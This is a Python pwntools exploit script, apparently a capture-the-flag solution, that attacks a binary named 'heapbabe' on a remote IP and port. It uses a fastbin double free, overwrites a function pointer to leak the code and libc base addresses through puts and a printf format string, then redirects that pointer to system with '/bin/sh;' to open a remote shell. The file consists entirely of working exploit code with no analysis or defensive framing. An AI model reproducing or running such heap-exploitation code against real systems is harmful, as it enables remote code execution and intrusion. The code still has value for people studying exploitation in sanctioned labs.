from pwn import *

libc = ELF('./libc-2.23.so')
# r = process('./heapbabe')
# r = process('./heapbabe', env={'LD_PRELOAD': './libc-2.23.so'})
r = remote('110.10.147.41', 8888)

def alloc(size, content):
	r.sendlineafter('>>', 'A')
	r.sendlineafter(':', str(size))
	r.sendafter(':', content)

def free(idx):
	r.sendlineafter('>>', 'F')
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', "DELETE")


alloc(0x60, 'A' * 0x60) # 0
alloc(0x60, 'A' * 0x60) # 1

log.info('fastbin dup')

free(0)
free(1)
free(0)

alloc(0xf, '\x00') # 0
alloc(0x20, 'A' * 0x18 + p16(0xaa)) # 1 (call puts)

free(0)

r.recvuntil('A' * 0x18, drop=True)
code_base_leak = u64(r.recvuntil('\n', drop=True).ljust(8, '\x00'))
code_base = code_base_leak - 0x0caa # call puts offset

log.info('code base : ' + hex(code_base))

free(1)

alloc(0xf, '\x00') # 0

payload  = '%12$p'
payload += 'A' * (0x20 - 8 - len(payload))
payload += p64(code_base + 0xdf0) # call printf
alloc(0x20, payload) # 1

free(1)

leaked = int(r.recvuntil('A' * 19, drop=True), 16)
libc.address = leaked - 0x3c56a3

log.info('libc base : ' + hex(libc.address))
log.info('system addr : ' + hex(libc.symbols['system']))

r.sendline('NO_DELETE')

free(0)

alloc(0xf, '\x00') # 0

payload  = '/bin/sh;'
payload += 'A' * (0x20 - 8 - len(payload))
payload += p64(libc.symbols['system'])
alloc(0x20, payload) # 1

free(0)

r.interactive()